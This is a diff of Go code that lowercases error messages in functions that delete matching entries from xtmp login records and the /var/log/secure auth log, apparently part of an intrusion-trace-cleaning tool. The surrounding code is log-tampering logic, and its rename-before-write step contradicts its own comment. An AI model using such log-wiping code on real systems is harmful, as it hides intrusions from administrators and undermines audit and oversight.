@@ -26,12 +26,12 @@ func deleteXtmpEntry(keyword string) (err error) {
 		)
 		xtmpf, err := os.Open(path)
 		if err != nil {
-			return fmt.Errorf("Failed to open xtmp: %v", err)
+			return fmt.Errorf("failed to open xtmp: %v", err)
 		}
 		defer xtmpf.Close()
 		xmtpData, err := os.ReadFile(path)
 		if err != nil {
-			return fmt.Errorf("Failed to read xtmp: %v", err)
+			return fmt.Errorf("failed to read xtmp: %v", err)
 		}
 
 		// back up xtmp file
@@ -53,12 +53,12 @@ func deleteXtmpEntry(keyword string) (err error) {
 		// save new file as xtmp.tmp, users need to rename it manually, in case the file is corrupted
 		newXtmp, err := os.OpenFile(path+".tmp", os.O_CREATE|os.O_RDWR, 0o664)
 		if err != nil {
-			return fmt.Errorf("Failed to open temp xtmp: %v", err)
+			return fmt.Errorf("failed to open temp xtmp: %v", err)
 		}
 		defer newXtmp.Close()
 		err = os.Rename(path+".tmp", path)
 		if err != nil {
-			return fmt.Errorf("Failed to replace %s: %v", path, err)
+			return fmt.Errorf("failed to replace %s: %v", path, err)
 		}
 
 		_, err = newXtmp.Write(newFileData)
@@ -72,9 +72,9 @@ func deleteXtmpEntry(keyword string) (err error) {
 			e := delete(xtmp)
 			if e != nil {
 				if err != nil {
-					err = fmt.Errorf("DeleteXtmpEntry: %v, %v", err, e)
+					err = fmt.Errorf("deleteXtmpEntry: %v, %v", err, e)
 				} else {
-					err = fmt.Errorf("DeleteXtmpEntry: %v", e)
+					err = fmt.Errorf("deleteXtmpEntry: %v", e)
 				}
 			}
 		}
@@ -90,7 +90,7 @@ func deleteAuthEntry(keyword string) (err error) {
 		path = "/var/log/secure"
 		logData, err = os.ReadFile(path)
 		if err != nil {
-			return fmt.Errorf("No auth log found: %v", err)
+			return fmt.Errorf("no auth log found: %v", err)
 		}
 	}
 	lines := strings.Split(string(logData), "\n")
